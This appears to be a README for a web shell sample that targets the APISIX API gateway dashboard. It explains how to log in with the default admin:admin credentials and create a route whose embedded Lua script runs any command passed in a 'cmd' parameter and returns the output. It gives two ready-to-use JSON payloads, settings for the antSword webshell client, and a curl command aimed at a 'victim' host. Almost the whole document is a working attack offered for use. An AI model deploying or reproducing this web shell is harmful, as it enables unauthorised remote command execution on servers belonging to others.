# apisix-webshell-sample
apisix admin dashboard script RCE web shell sample

## APISIX - Authed RCE

APISIX Dashboard default at port 9080

and you can have default credit admin:admin to get admin login.

### create route and use 查看/watch edit json like this.

```json
{
  "uri": "/rceEndpoint",
  "name": "RCE{not same}",
  "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n local args = assert(ngx.req.get_uri_args()) \n local f =        assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
  "upstream": {
    "nodes": [
      {
        "host": "example.com",
        "port": 80,
        "weight": 1
      }
    ],
    "type": "roundrobin",
    "hash_on": "vars",
    "scheme": "http",
    "pass_host": "pass"
  },
  "status": 1
}
```

if you got schema error add script_id as id show when your route create complete.

and using **http://victim:port/rceEndpoint?cmd={your_command}**

to get an shell.

## antSword Settings

payload like

```json
{
  "uri": "/rceEndpoint",
  "name": "data",
  "script": "local _M = {} \n function _M.access(conf, ctx) \n local os = require('os')\n ngx.req.read_body() \n local args = assert(ngx.req.get_post_args()) \n local f = assert(io.popen(args.cmd, 'r'))\n local s = assert(f:read('*a'))\n ngx.say(s)\n f:close()  \n end \nreturn _M",
  "script_id": "0000000114514",
  "upstream": {
    "nodes": [
      {
        "host": "example.com",
        "port": 80,
        "weight": 1
      }
    ],
    "type": "roundrobin",
    "hash_on": "vars",
    "scheme": "http",
    "pass_host": "pass"
  },
  "status": 1
}
```

and setting data 

like 

target is **http://victim:port/rceEndpoint** 

password is cmd 

type is linuxcmd

manually:
```
curl http://victim:port/rceEndpoint -d "cmd={your_commnad}"
```

.....to be continued.
